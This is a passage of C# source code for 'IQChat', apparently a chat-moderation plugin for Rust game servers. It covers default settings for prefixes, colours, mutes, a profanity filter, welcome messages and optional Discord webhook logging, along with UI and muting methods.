                    [JsonProperty(LanguageEn ? "Setting up general chat logging" : "Настройка логирования общего чата")]
                    public General GlobalChatSettings = new General();     
                    [JsonProperty(LanguageEn ? "Setting up team chat logging" : "Настройка логирования тим чата")]
                    public General TeamChatSettings = new General();
                }
                internal class General
                {
                    [JsonProperty(LanguageEn ? "Enable logging (true - yes/false - no)" : "Включить логирование (true - да/false - нет)")]
                    public Boolean UseLogged = false;
                    [JsonProperty(LanguageEn ? "Webhooks channel for logging" : "Webhooks канала для логирования")]
                    public String Webhooks = "";
                }
            }
                        
            public static Configuration GetNewConfiguration()
            {
                return new Configuration
                {
                                        ControllerParameter = new ControllerParameters
                    {
                        VisualParametres = new ControllerParameters.VisualSettingParametres
                        {
                            PrefixType = SelectedParametres.DropList,
                            ChatColorType = SelectedParametres.DropList,
                            NickColorType = SelectedParametres.Slider,
                            IQRankSystemType = SelectedParametres.Slider,
                        },
                        Prefixes = new ControllerParameters.PrefixSetting
                        {
                              TurnMultiPrefixes = false,
                              MaximumMultiPrefixCount = 5,
                              Prefixes = new List<ControllerParameters.AdvancedFuncion>
                              {
                                  new ControllerParameters.AdvancedFuncion
                                  {
                                      Argument = LanguageEn ? "<color=#CC99FF>[PLAYER]</color>" : "<color=#CC99FF>[ИГРОК]</color>",
                                      Permissions = "iqchat.default",
                                  },
                                  new ControllerParameters.AdvancedFuncion
                                  {
                                      Argument = "<color=#ffff99>[VIP]</color>",
                                      Permissions = "iqchat.admin",
                                  },
                                  new ControllerParameters.AdvancedFuncion
                                  {
                                      Argument = LanguageEn ? "<color=#ff9999>[ADMIN]</color>" : "<color=#ff9999>[АДМИН]</color>",
                                      Permissions = "iqchat.admin",
                                  },
                            },
                        },
                        MessageColorList = new List<ControllerParameters.AdvancedFuncion>
                        {
                               new ControllerParameters.AdvancedFuncion
                               {
                                    Argument = "#CC99FF",
                                    Permissions = "iqchat.default",
                               },
                               new ControllerParameters.AdvancedFuncion
                               {
                                    Argument = "#ffff99",
                                    Permissions = "iqchat.admin",
                               },
                               new ControllerParameters.AdvancedFuncion
                               {
                                    Argument = "#ff9999",
                                    Permissions = "iqchat.admin",
                               },
                        },
                        NickColorList = new List<ControllerParameters.AdvancedFuncion>
                        {
                               new ControllerParameters.AdvancedFuncion
                               {
                                    Argument = "#CC99FF",
                                    Permissions = "iqchat.default",
                               },
                               new ControllerParameters.AdvancedFuncion
                               {
                                    Argument = "#ffff99",
                                    Permissions = "iqchat.admin",
                               },
                               new ControllerParameters.AdvancedFuncion
                               {
                                    Argument = "#ff9999",
                                    Permissions = "iqchat.admin",
                               },
                        },
                    },
                    
                    
                    ControllerConnect = new ControllerConnection
                    {
                        SetupDefaults = new ControllerConnection.SetupDefault
                        {
                            PrefixDefault = LanguageEn ? "<color=#CC99FF>[PLAYER]</color>" : "<color=#CC99FF>[ИГРОК]</color>",
                            MessageDefault = "#33CCCC", 
                            NickDefault = "#0099FF",
                        },
                        Turneds = new ControllerConnection.Turned
                        {
                            TurnAutoDropColorChat = true,
                            TurnAutoDropColorNick = true,
                            TurnAutoDropPrefix = true,
                            TurnAutoSetupColorChat = true,
                            TurnAutoSetupColorNick = true,
                            TurnAutoSetupPrefix = true,
                        }
                    },

                    
                    
                    ControllerMutes = new ControllerMute
                    {
                        LoggedMute = new ControllerMute.LoggedFuncion
                        {
                            UseHistoryMessage = false,
                            CountHistoryMessage = 10,
                        },
                        AutoMuteSettings = new ControllerMute.AutoMute
                        {
                            UseAutoMute = true,
                            AutoMuted = new ControllerMute.Muted
                            {
                                Reason = LanguageEn ? "Automatic chat blocking" : "Автоматическая блокировка чата",
                                SecondMute = 300,
                            }
                        },
                        MuteChatReasons = new List<ControllerMute.Muted>
                        {
                            new ControllerMute.Muted
                            {
                                Reason = LanguageEn ? "Aggressive behavior" : "Агрессивное поведение",
                                SecondMute = 100,
                            },
                            new ControllerMute.Muted
                            {
                                Reason = LanguageEn ? "Insults" : "Оскорбления",
                                SecondMute = 300,
                            },
                            new ControllerMute.Muted
                            {
                                Reason = LanguageEn ? "Insult (repeated violation)" : "Оскорбление (повторное нарушение)",
                                SecondMute = 1000,
                            },
                            new ControllerMute.Muted
                            {
                                Reason = LanguageEn ? "Advertising" : "Реклама",
                                SecondMute = 5000,
                            },
                            new ControllerMute.Muted
                            {
                                Reason = LanguageEn ? "Humiliation" : "Унижение",
                                SecondMute = 300,
                            }, 
                            new ControllerMute.Muted
                            {
                                Reason = LanguageEn ? "Spam" : "Спам",
                                SecondMute = 60,
                            },   
                        },
                        MuteVoiceReasons = new List<ControllerMute.Muted>
                        {
                            new ControllerMute.Muted
                            {
                                Reason = LanguageEn ? "Aggressive behavior" : "Агрессивное поведение",
                                SecondMute = 100,
                            },
                            new ControllerMute.Muted
                            {
                                Reason = LanguageEn ? "Insults" : "Оскорбления",
                                SecondMute = 300,
                            },      
                            new ControllerMute.Muted
                            {
                                Reason = LanguageEn ? "Disruption of the event by shouting" : "Срыв мероприятия криками",
                                SecondMute = 300,
                            },
                        }
                    },

                    
                    
                    ControllerMessages = new ControllerMessage
                    {
                        Formatting = new ControllerMessage.FormattingMessage
                        {
                            UseBadWords = true,
                            BadWords = LanguageEn ? new List<String> { "fuckyou", "sucking", "fucking", "fuck" } : new List<String> { "бля", "сука", "говно", "тварь" },
                            FormatMessage = true,
                            ReplaceBadWord = "***",
                            ControllerNickname = new ControllerMessage.FormattingMessage.NickController
                            {
                                BadNicks = LanguageEn ? new List<String> { "Admin", "Moderator", "Administrator", "Moder", "Owner", "Mercury Loh", "IQchat" } : new List<String> { "Администратор", "Модератор", "Админ", "Модер", "Овнер", "Mercury Loh", "IQchat" },
                                AllowedLinkNick = new List<String> { "mysite.com" },
                                ReplaceBadNick = "",
                                UseNickController = true,
                            },
                        },
                        TurnedFunc = new ControllerMessage.TurnedFuncional
                        {
                            HideAdminGave = true,
                            IgnoreUsePM = true,
                            MuteTeamChat = true,
                            AntiNoobSetting = new ControllerMessage.TurnedFuncional.AntiNoob
                            {
                                AntiNoobChat = new ControllerMessage.TurnedFuncional.AntiNoob.Settings
                                {
                                    AntiNoobActivate = false,
                                    TimeBlocked = 1200,
                                },
                                AntiNoobPM = new ControllerMessage.TurnedFuncional.AntiNoob.Settings
                                {
                                    AntiNoobActivate = false,
                                    TimeBlocked = 1200,
                                },
                            },
                            AntiSpamSetting = new ControllerMessage.TurnedFuncional.AntiSpam
                            {
                                AntiSpamActivate = true,
                                FloodTime = 10,
                                AntiSpamDuplesSetting = new ControllerMessage.TurnedFuncional.AntiSpam.AntiSpamDuples
                                {
                                    AntiSpamDuplesActivate = true,
                                    MuteSetting = new ControllerMute.Muted
                                    {
                                        Reason = LanguageEn ? "Duplicate messages (SPAM)" : "Повторяющиеся сообщения (СПАМ)",
                                        SecondMute = 300,
                                    },
                                    TryDuples = 3,
                                }
                            },
                            PMSetting = new ControllerMessage.TurnedFuncional.PM
                            {
                                PMActivate = true,
                                SoundPM = "assets/bundled/prefabs/fx/notice/stack.world.fx.prefab",
                            },
                        },
                        GeneralSetting = new ControllerMessage.GeneralSettings
                        {
                            BroadcastFormat = new ControllerMessage.GeneralSettings.BroadcastSettings
                            {
                                BroadcastColor = "#efedee",
                                BroadcastTitle = LanguageEn ? "<color=#68cacd><b>[Alert]</b></color>" : "<color=#68cacd><b>[ОПОВЕЩЕНИЕ]</b></color>",
                                Steam64IDAvatar = "0",
                            },
                            AlertFormat = new ControllerMessage.GeneralSettings.AlertSettings
                            {
                                AlertPlayerColor = "#efedee",
                                SoundAlertPlayer = "assets/bundled/prefabs/fx/notice/item.select.fx.prefab",
                            },
                            OtherSetting = new ControllerMessage.GeneralSettings.OtherSettings
                            {
                                TimeDeleteAlertUI = 5,
                                SizePrefix = 14,
                                SizeMessage = 14,
                                SizeNick = 14,
                            }
                        },
                    },

                    
                    
                    ControllerAlertSetting = new ControllerAlert
                    {
                        AlertSetting = new ControllerAlert.Alert
                        {
                            AlertMessage = true,
                            AlertMessageType = false,
                            MessageList = new LanguageController()
                            {
                                LanguageMessages = new Dictionary<String, List<String>>()
                                {
                                    ["en"] = new List<String>()
                                    {
                                        "Automatic message #1 (Edit in configuration)",
                                        "Automatic message #2 (Edit in configuration)",
                                        "Automatic message #3 (Edit in configuration)",
                                        "Automatic message #4 (Edit in configuration)",
                                        "Automatic message #5 (Edit in configuration)",
                                        "Automatic message #6 (Edit in configuration)",
                                    },
                                    ["ru"] = new List<String>()
                                    {
                                        "Автоматическое сообщение #1 (Редактировать в конфигурации)",
                                        "Автоматическое сообщение #2 (Редактировать в конфигурации)",
                                        "Автоматическое сообщение #3 (Редактировать в конфигурации)",
                                        "Автоматическое сообщение #4 (Редактировать в конфигурации)",
                                        "Автоматическое сообщение #5 (Редактировать в конфигурации)",
                                        "Автоматическое сообщение #6 (Редактировать в конфигурации)",
                                    }
                                },
                            },
                            MessageListTimer = 60,
                        },
                        AdminSessionSetting = new ControllerAlert.AdminSession
                        {
                            ConnectedAlertAdmin = false,
                            DisconnectedAlertAdmin = false,
                        },
                        PlayerSessionSetting = new ControllerAlert.PlayerSession
                        {
                            ConnectedAlert = true,
                            ConnectedAvatarUse = true,
                            ConnectedWorld = true,
                            ConnectionAlertRandom = false,

                            DisconnectedAlert = true,
                            DisconnectedAlertRandom = false,
                            DisconnectedReason = true,
                  
                            RandomConnectionAlert = new LanguageController
                            {
                                LanguageMessages = new Dictionary<String, List<String>>()
                                {
                                    ["en"] = new List<String>()
                                    {
                                        "{0} flew in from {1}", 
                                        "{0} flew into the server from{1}", 
                                        "{0} jumped on a server"
                                    },
                                    ["ru"] = new List<String>()
                                    {
                                        "{0} влетел как дурачок из {1}",
                                        "{0} залетел на сервер из {1}, соболезнуем",
                                        "{0} прыгнул на сервачок"
                                    }
                                }
                            },
                            RandomDisconnectedAlert = new LanguageController()
                            {
                                LanguageMessages = new Dictionary<String, List<String>>()
                                {
                                    ["en"] = new List<String>()
                                    {
                                        "{0} gone to another world",
                                        "{0} left the server with a reason {1}",
                                        "{0} went to another server"
                                    },
                                    ["ru"] = new List<String>()
                                    {
                                        "{0} ушел в мир иной",
                                        "{0} вылетел с сервера с причиной {1}",
                                        "{0} пошел на другой сервачок"
                                    }
                                }
                            },
                        },
                        PersonalAlertSetting = new ControllerAlert.PersonalAlert
                        {
                            UseWelcomeMessage = true,
                            WelcomeMessage = new LanguageController
                            {
                                LanguageMessages = new Dictionary<String, List<String>>()
                                {
                                    ["en"] = new List<String>()
                                    {
                                        "Welcome to the server SUPERSERVER\nWe are glad that you chose us!",
                                        "Welcome back to the server!\nWe wish you good luck",
                                        "Welcome to the server\nWe have the best plugins",
                                    },
                                    ["ru"] = new List<String>()
                                    {
                                        "Добро пожаловать на сервер SUPERSERVER\nРады,что выбрал именно нас!",
                                        "С возвращением на сервер!\nЖелаем тебе удачи",
                                        "Добро пожаловать на сервер\nУ нас самые лучшие плагины",
                                    }
                                }
                            },
                        }
                    },

                    
                    
                    ReferenceSetting = new ReferenceSettings
                    {
                        IQFakeActiveSettings = new ReferenceSettings.IQFakeActive
                        {
                            UseIQFakeActive = true,
                        },
                        IQRankSystems = new ReferenceSettings.IQRankSystem
                        {
                            FormatRank = "[{0}]",
                            FormatRankTime = "[{0}]",
                            UseRankSystem = false,
                            UseTimeStandart = true
                        },
                        XLevelsSettings = new ReferenceSettings.XLevels()
                        {
                            UseXLevels = false,
                        }
                    },

                    
                    
                    RustPlusSettings = new RustPlus
                    {
                        UseRustPlus = true,
                        DisplayNameAlert = LanguageEn ? "SUPER SERVER" : "СУПЕР СЕРВЕР",
                    },

                    
                    
                    AnswerMessages = new AnswerMessage
                    {
                        UseAnswer = true,
                        AnswerMessageList = new Dictionary<String, LanguageController>()
                        {
                            ["wipe"] = new LanguageController()
                            {
                                LanguageMessages = new Dictionary<String, List<String>>()
                                {
                                    ["en"] = new List<String>()
                                    {
                                        "Wipe will be 27.06"
                                    },
                                    ["ru"] = new List<String>()
                                    {
                                        "Вайп будет 27.06"
                                    }
                                }
                            },
                            ["читер"] = new LanguageController()
                            {
                                LanguageMessages = new Dictionary<String, List<String>>()
                                {
                                    ["en"] = new List<String>()
                                    {
                                        "Found a cheater? Write /report and send a complaint"
                                    },
                                    ["ru"] = new List<String>()
                                    {
                                        "Нашли читера?Напиши /report и отправь жалобу"
                                    }
                                }
                            }
                        },
                    },

                    
                    
                    OtherSetting = new OtherSettings
                    {
                        LogsChat = new OtherSettings.LoggedChat
                        {
                            GlobalChatSettings = new OtherSettings.General
                            {
                                UseLogged = false,
                                Webhooks = "",
                            },
                            TeamChatSettings = new OtherSettings.General
                            {
                                UseLogged = false,
                                Webhooks = "",
                            }
                        },
                        LogsChatCommands = new OtherSettings.General
                        {
                            UseLogged = false,
                            Webhooks = "",
                        },
                        LogsPMChat = new OtherSettings.General
                        {
                            UseLogged = false,
                            Webhooks = "",
                        },
                        LogsMuted = new OtherSettings.General
                        {
                            UseLogged = false,
                            Webhooks = "",
                        },
                    },

                                    };
            }
        }
        Boolean API_CHECK_VOICE_CHAT(UInt64 ID) 
        {
            if (!UserInformation.ContainsKey(ID)) return false;
            return UserInformation[ID].MuteInfo.IsMute(MuteType.Voice);
        }
        private void UserConnecteionData(BasePlayer player)
        {
            if (config.ControllerMessages.TurnedFunc.AntiNoobSetting.AntiNoobPM.AntiNoobActivate || config.ControllerMessages.TurnedFunc.AntiNoobSetting.AntiNoobChat.AntiNoobActivate) 
            {
                if (!UserInformationConnection.ContainsKey(player.userID)) 
                    UserInformationConnection.Add(player.userID, new AntiNoob()); 
            }

            Configuration.ControllerConnection ControllerConntect = config.ControllerConnect;
            Configuration.ControllerParameters ControllerParameter = config.ControllerParameter;
            if (ControllerConntect == null || ControllerParameter  == null || UserInformation.ContainsKey(player.userID)) return;

            User Info = new User();
            if (ControllerConntect.Turneds.TurnAutoSetupPrefix) 
            {
                if (ControllerParameter.Prefixes.TurnMultiPrefixes) 
                    Info.Info.PrefixList.Add(ControllerConntect.SetupDefaults.PrefixDefault ?? ""); 
                else Info.Info.Prefix = ControllerConntect.SetupDefaults.PrefixDefault ?? "";
            }

            if (ControllerConntect.Turneds.TurnAutoSetupColorNick) 
                Info.Info.ColorNick = ControllerConntect.SetupDefaults.NickDefault; 
		   		 		  						  	   		  	  			  	  			  	   		  		  
            if (ControllerConntect.Turneds.TurnAutoSetupColorChat) 
                Info.Info.ColorMessage = ControllerConntect.SetupDefaults.MessageDefault; 

            Info.Info.Rank = String.Empty;

            UserInformation.Add(player.userID, Info); 
        }
        void OnPlayerCommand(BasePlayer player, string command, string[] args)
        {
            DiscordLoggCommand(player, command, args);
        }
        
                private void DrawUI_IQChat_Context(BasePlayer player)
        {
            String Interface = InterfaceBuilder.GetInterface("UI_Chat_Context");
            User Info = UserInformation[player.userID];
            Configuration.ControllerParameters ControllerParameter = config.ControllerParameter;
            if (Info == null || ControllerParameter == null || Interface == null) return;

            String BackgroundStatic = IQRankSystem && config.ReferenceSetting.IQRankSystems.UseRankSystem ? "UI_IQCHAT_CONTEXT_RANK" : "UI_IQCHAT_CONTEXT_NO_RANK";
            Interface = Interface.Replace("%IMG_BACKGROUND%", ImageUi.GetImage(BackgroundStatic));
            Interface = Interface.Replace("%TITLE%", GetLang("IQCHAT_CONTEXT_TITLE", player.UserIDString));
            Interface = Interface.Replace("%SETTING_ELEMENT%", GetLang("IQCHAT_CONTEXT_SETTING_ELEMENT_TITLE", player.UserIDString));
            Interface = Interface.Replace("%INFORMATION%", GetLang("IQCHAT_CONTEXT_INFORMATION_TITLE", player.UserIDString));
            Interface = Interface.Replace("%SETTINGS%", GetLang("IQCHAT_CONTEXT_SETTINGS_TITLE", player.UserIDString));
            Interface = Interface.Replace("%SETTINGS_PM%", GetLang("IQCHAT_CONTEXT_SETTINGS_PM_TITLE", player.UserIDString));
            Interface = Interface.Replace("%SETTINGS_ALERT%", GetLang("IQCHAT_CONTEXT_SETTINGS_ALERT_TITLE", player.UserIDString));
            Interface = Interface.Replace("%SETTINGS_ALERT_PM%", GetLang("IQCHAT_CONTEXT_SETTINGS_ALERT_PM_TITLE", player.UserIDString));
            Interface = Interface.Replace("%SETTINGS_SOUNDS%", GetLang("IQCHAT_CONTEXT_SETTINGS_SOUNDS_TITLE", player.UserIDString));
            Interface = Interface.Replace("%MUTE_STATUS_TITLE%", GetLang("IQCHAT_CONTEXT_MUTE_STATUS_TITLE", player.UserIDString));
            Interface = Interface.Replace("%IGNORED_STATUS_COUNT%", GetLang("IQCHAT_CONTEXT_IGNORED_STATUS_COUNT", player.UserIDString, Info.Settings.IgnoreUsers.Count));
            Interface = Interface.Replace("%IGNORED_STATUS_TITLE%", GetLang("IQCHAT_CONTEXT_IGNORED_STATUS_TITLE", player.UserIDString));
            Interface = Interface.Replace("%NICK_DISPLAY_TITLE%", GetLang("IQCHAT_CONTEXT_NICK_DISPLAY_TITLE", player.UserIDString));
            Interface = Interface.Replace("%MUTE_STATUS_PLAYER%", Info.MuteInfo.IsMute(MuteType.Chat) ? FormatTime(Info.MuteInfo.GetTime(MuteType.Chat), player.UserIDString) : GetLang("IQCHAT_CONTEXT_MUTE_STATUS_NOT", player.UserIDString));
            Interface = Interface.Replace("%SLIDER_PREFIX_TITLE%", GetLang("IQCHAT_CONTEXT_SLIDER_PREFIX_TITLE", player.UserIDString));
            Interface = Interface.Replace("%SLIDER_NICK_COLOR_TITLE%", GetLang("IQCHAT_CONTEXT_SLIDER_NICK_COLOR_TITLE", player.UserIDString));
            Interface = Interface.Replace("%SLIDER_MESSAGE_COLOR_TITLE%", GetLang("IQCHAT_CONTEXT_SLIDER_MESSAGE_COLOR_TITLE", player.UserIDString));
            Interface = Interface.Replace("%SLIDER_IQRANK_TITLE%", IQRankSystem && config.ReferenceSetting.IQRankSystems.UseRankSystem ? GetLang("IQCHAT_CONTEXT_SLIDER_IQRANK_TITLE", player.UserIDString) : String.Empty);
		   		 		  						  	   		  	  			  	  			  	   		  		  
            CuiHelper.DestroyUi(player, InterfaceBuilder.UI_Chat_Context);
            CuiHelper.AddUi(player, Interface);

            DrawUI_IQChat_Update_DisplayName(player);
   
            if (ControllerParameter.VisualParametres.PrefixType == SelectedParametres.DropList || ControllerParameter.Prefixes.TurnMultiPrefixes)
                DrawUI_IQChat_DropList(player, "-46.788 67.4", "-14.788 91.4", GetLang("IQCHAT_CONTEXT_SLIDER_PREFIX_TITLE_DESCRIPTION", player.UserIDString), ControllerParameter.Prefixes.TurnMultiPrefixes ? TakeElementUser.MultiPrefix : TakeElementUser.Prefix);
            else DrawUI_IQChat_Sliders(player, "SLIDER_PREFIX", "-140 54", "-16 78", TakeElementUser.Prefix);
		   		 		  						  	   		  	  			  	  			  	   		  		  
            if (ControllerParameter.VisualParametres.NickColorType == SelectedParametres.DropList)
                DrawUI_IQChat_DropList(player, "112.34 67.4", "144.34 91.4", GetLang("IQCHAT_CONTEXT_SLIDER_CHAT_NICK_TITLE_DESCRIPTION", player.UserIDString), TakeElementUser.Nick);
            else DrawUI_IQChat_Sliders(player, "SLIDER_NICK_COLOR", "20 54", "144 78", TakeElementUser.Nick);

            if (ControllerParameter.VisualParametres.ChatColorType == SelectedParametres.DropList)
                DrawUI_IQChat_DropList(player, "-46.787 -0.591", "-14.787 23.409", GetLang("IQCHAT_CONTEXT_SLIDER_CHAT_MESSAGE_TITLE_DESCRIPTION", player.UserIDString), TakeElementUser.Chat);
            else DrawUI_IQChat_Sliders(player, "SLIDER_MESSAGE_COLOR", "-140 -12", "-16 12", TakeElementUser.Chat);


            if (IQRankSystem && config.ReferenceSetting.IQRankSystems.UseRankSystem)
            {
                if (ControllerParameter.VisualParametres.IQRankSystemType == SelectedParametres.DropList)
                        DrawUI_IQChat_DropList(player, "112.34 -0.591", "144.34 23.409", GetLang("IQCHAT_CONTEXT_SLIDER_IQRANK_TITLE_DESCRIPTION", player.UserIDString), TakeElementUser.Rank);
                    else DrawUI_IQChat_Sliders(player, "SLIDER_IQRANK", "20 -12", "144 12", TakeElementUser.Rank);
            }

            DrawUI_IQChat_Update_Check_Box(player, ElementsSettingsType.PM, "143.38 -67.9", "151.38 -59.9", Info.Settings.TurnPM); 
            DrawUI_IQChat_Update_Check_Box(player, ElementsSettingsType.Broadcast, "143.38 -79.6", "151.38 -71.6", Info.Settings.TurnBroadcast); 
            DrawUI_IQChat_Update_Check_Box(player, ElementsSettingsType.Alert, "143.38 -91.6", "151.38 -83.6", Info.Settings.TurnAlert); 
            DrawUI_IQChat_Update_Check_Box(player, ElementsSettingsType.Sound, "143.38 -103.6", "151.38 -95.6", Info.Settings.TurnSound);
            DrawUI_IQChat_Context_AdminAndModeration(player);
        }
        private void OnServerInitialized()
        {
            _ = this;
            ImageUi.DownloadImages();
		   		 		  						  	   		  	  			  	  			  	   		  		  
            MigrateDataToNoob();

            foreach (BasePlayer player in BasePlayer.activePlayerList)
                UserConnecteionData(player);

            RegisteredPermissions();
            BroadcastAuto();

            CheckValidateUsers();
            
            if (!config.ControllerMessages.Formatting.ControllerNickname.UseNickController)
                Unsubscribe("OnUserConnected");

        }
        /// <summary>
        /// Обновление 2.///
        /// Изменения :
        /// - Корректировка поиска "Плохих слов"
        /// Исправления :
        /// - Исправлен NRE в команде unmute
        /// </summary>
        
                [PluginReference] Plugin ImageLibrary, IQPersonal, IQFakeActive, IQRankSystem, XLevels, Clans;
        void Init()
        {
            ReadData();
        }
        public String GetMessages(BasePlayer player, Dictionary<String, List<String>> LanguageMessages)
        {
            String LangPlayer = _.lang.GetLanguage(player.UserIDString);

            if (LanguageMessages.ContainsKey(LangPlayer))
                return LanguageMessages[LangPlayer].GetRandom();
            else if (LanguageMessages.ContainsKey("en"))
                return LanguageMessages["en"].GetRandom();
            else return LanguageMessages.FirstOrDefault().Value.GetRandom();
        }
        public class FakePlayer
        {
            public ulong UserID;
            public string DisplayName;
        }
        private void OnUserConnected(IPlayer player) => ControlledBadNick(player);
        List<String> IQRankListKey(ulong userID) => (List<string>)(IQRankSystem?.Call("API_RANK_USER_KEYS", userID));
        
                private void DrawUI_IQChat_Mute_Alert(BasePlayer player, BasePlayer Target, UInt64 IDFake = 0)
        { 
            String InterfacePanel = InterfaceBuilder.GetInterface("UI_Chat_Mute_And_Ignore_Alert_Panel");
            String Interface = InterfaceBuilder.GetInterface("UI_Chat_Mute_Alert");
            if (Interface == null || InterfacePanel == null) return;

            User InfoTarget = (IQFakeActive && Target == null && IDFake != 0) ? null : UserInformation[Target.userID];

            Interface = Interface.Replace("%TITLE%", GetLang("IQCHAT_BUTTON_MODERATION_MUTE_MENU_TITLE_ALERT", player.UserIDString));
            Interface = Interface.Replace("%BUTTON_TAKE_CHAT_ACTION%", InfoTarget == null ? GetLang("IQCHAT_BUTTON_MODERATION_MUTE_MENU_TITLE_ALERT_CHAT", player.UserIDString) : InfoTarget.MuteInfo.IsMute(MuteType.Chat) ? GetLang("IQCHAT_BUTTON_MODERATION_UNMUTE_MENU_TITLE_ALERT_CHAT", player.UserIDString) : GetLang("IQCHAT_BUTTON_MODERATION_MUTE_MENU_TITLE_ALERT_CHAT", player.UserIDString));
            Interface = Interface.Replace("%BUTTON_TAKE_VOICE_ACTION%", InfoTarget == null ? GetLang("IQCHAT_BUTTON_MODERATION_MUTE_MENU_TITLE_ALERT_VOICE", player.UserIDString) : InfoTarget.MuteInfo.IsMute(MuteType.Voice) ? GetLang("IQCHAT_BUTTON_MODERATION_UNMUTE_MENU_TITLE_ALERT_VOICE", player.UserIDString) : GetLang("IQCHAT_BUTTON_MODERATION_MUTE_MENU_TITLE_ALERT_VOICE", player.UserIDString));
            Interface = Interface.Replace("%COMMAND_TAKE_ACTION_MUTE_CHAT%", InfoTarget == null ? $"newui.cmd action.mute.ignore ignore.and.mute.controller {SelectedAction.Mute} open.reason.mute {IDFake} {MuteType.Chat}" : InfoTarget.MuteInfo.IsMute(MuteType.Chat) ? $"newui.cmd action.mute.ignore ignore.and.mute.controller {SelectedAction.Mute} unmute.yes {Target.UserIDString} {MuteType.Chat}" : $"newui.cmd action.mute.ignore ignore.and.mute.controller {SelectedAction.Mute} open.reason.mute {Target.UserIDString} {MuteType.Chat}"); 
            Interface = Interface.Replace("%COMMAND_TAKE_ACTION_MUTE_VOICE%", InfoTarget == null ? $"newui.cmd action.mute.ignore ignore.and.mute.controller {SelectedAction.Mute} open.reason.mute {IDFake} {MuteType.Voice}" : InfoTarget.MuteInfo.IsMute(MuteType.Voice) ? $"newui.cmd action.mute.ignore ignore.and.mute.controller {SelectedAction.Mute} unmute.yes {Target.UserIDString} {MuteType.Voice}" : $"newui.cmd action.mute.ignore ignore.and.mute.controller {SelectedAction.Mute} open.reason.mute {Target.UserIDString} {MuteType.Voice}"); 
            
            CuiHelper.DestroyUi(player, "MUTE_AND_IGNORE_PANEL_ALERT");
            CuiHelper.AddUi(player, InterfacePanel);
            CuiHelper.AddUi(player, Interface);
        }       

        private void DrawUI_IQChat_Mute_Alert_Reasons(BasePlayer player, BasePlayer Target, String Reason, Int32 Y, MuteType Type, UInt64 IDFake = 0)
        {
            String Interface = InterfaceBuilder.GetInterface("UI_Chat_Mute_Alert_DropList_Reason");
            if (Interface == null) return;

            Interface = Interface.Replace("%OFFSET_MIN%", $"-147.5 {85.42 - (Y * 40)}");
            Interface = Interface.Replace("%OFFSET_MAX%", $"147.5 {120.42 - (Y * 40)}");
            Interface = Interface.Replace("%REASON%", Reason);
            Interface = Interface.Replace("%COMMAND_REASON%", $"newui.cmd action.mute.ignore ignore.and.mute.controller {SelectedAction.Mute} confirm.yes {((IQFakeActive && Target == null && IDFake != 0)  ? IDFake : Target.userID)} {Type} {Y}");
            CuiHelper.AddUi(player, Interface);
        }

        private String Format(Int32 units, String form1, String form2, String form3)
        {
            var tmp = units % 10;

            if (units >= 5 && units <= 20 || tmp >= 5 && tmp <= 9)
                return $"{units}{form1}";

            if (tmp >= 2 && tmp <= 4)
                return $"{units}{form2}";

            return $"{units}{form3}";
        }

        private void UnmutePlayer(BasePlayer Target, MuteType Type, BasePlayer Moderator = null, Boolean HideUnmute = false, Boolean Command = false)
        {
            if (!UserInformation.ContainsKey(Target.userID)) return;
            User Info = UserInformation[Target.userID];

            GeneralInformation.RenameInfo TargetRename = GeneralInfo.GetInfoRename(Target.userID);
            GeneralInformation.RenameInfo ModeratorRename = Moderator != null ? GeneralInfo.GetInfoRename(Moderator.userID) : null;
            if(!Info.MuteInfo.IsMute(Type))
            {
                if (Moderator != null)
                    ReplySystem(Moderator, LanguageEn ? "The player is not banned" : "У игрока нет блокировки");
                else Puts(LanguageEn ? "The player is not banned!" : "У игрока нет блокировки!");
                return;
            }

            String TargetName = TargetRename != null ? $"{TargetRename.RenameNick ?? Target.displayName}" : Target.displayName;
            String NameModerator = Moderator == null ? GetLang("IQCHAT_FUNCED_ALERT_TITLE_SERVER", Target.UserIDString) : ModeratorRename != null ? $"{ModeratorRename.RenameNick ?? Moderator.displayName}" : Moderator.displayName;
            String LangMessage = Type == MuteType.Chat ? "FUNC_MESSAGE_UNMUTE_CHAT" : "FUNC_MESSAGE_UNMUTE_VOICE";
		   		 		  						  	   		  	  			  	  			  	   		  		  
            if (!HideUnmute)
                ReplyBroadcast(GetLang(LangMessage, Target.UserIDString, NameModerator, TargetName));
            else
            {
                if (Target != null)
                    ReplySystem(Target, GetLang(LangMessage, Target.UserIDString, NameModerator, TargetName));
                if (Moderator != null)
                    ReplySystem(Moderator, GetLang(LangMessage, Target.UserIDString, NameModerator, TargetName));
            }

            Info.MuteInfo.UnMute(Type);
		   		 		  						  	   		  	  			  	  			  	   		  		  
            DiscordLoggMuted(Target, Type, Moderator: Moderator);
        }
        
        private void DrawUI_IQChat_Mute_And_Ignore_Player_Panel(BasePlayer player, SelectedAction Action, Int32 Page = 0, String SearchName = null) 
        {
            String Interface = InterfaceBuilder.GetInterface("UI_Chat_Mute_And_Ignore_Panel_Content"); 
            if (Interface == null) return;

            CuiHelper.DestroyUi(player, "MuteIgnorePanelContent");
            CuiHelper.AddUi(player, Interface);

            if (IQFakeActive)
            {
                var FakePlayerList = Action == SelectedAction.Mute ? SearchName != null ? PlayerBases.Where(p => p.DisplayName.ToLower().Contains(SearchName.ToLower())).OrderByDescending(p => !IsFake(p.UserID) && UserInformation.ContainsKey(p.UserID) && (UserInformation[p.UserID].MuteInfo.IsMute(MuteType.Chat) || UserInformation[p.UserID].MuteInfo.IsMute(MuteType.Voice))) : PlayerBases.OrderByDescending(p => !IsFake(p.UserID) && UserInformation.ContainsKey(p.UserID) && (UserInformation[p.UserID].MuteInfo.IsMute(MuteType.Chat) || UserInformation[p.UserID].MuteInfo.IsMute(MuteType.Voice))) :
                                                                            SearchName != null ? PlayerBases.Where(p => p.DisplayName.ToLower().Contains(SearchName.ToLower())).OrderByDescending(p => !IsFake(p.UserID) && UserInformation.ContainsKey(p.UserID) && (UserInformation[player.userID].Settings.IgnoreUsers.Contains(p.UserID))) : PlayerBases.OrderByDescending(p => !IsFake(p.UserID) && UserInformation.ContainsKey(p.UserID) && (UserInformation[player.userID].Settings.IgnoreUsers.Contains(p.UserID)));

                DrawUI_IQChat_Mute_And_Ignore_Pages(player, (Boolean)(FakePlayerList.Skip(18 * (Page + 1)).Count() > 0), Action, Page);
                DrawUI_IQChat_Mute_And_Ignore_Player(player, Action, null, FakePlayerList.Skip(18 * Page).Take(18));
            }
            else
            {
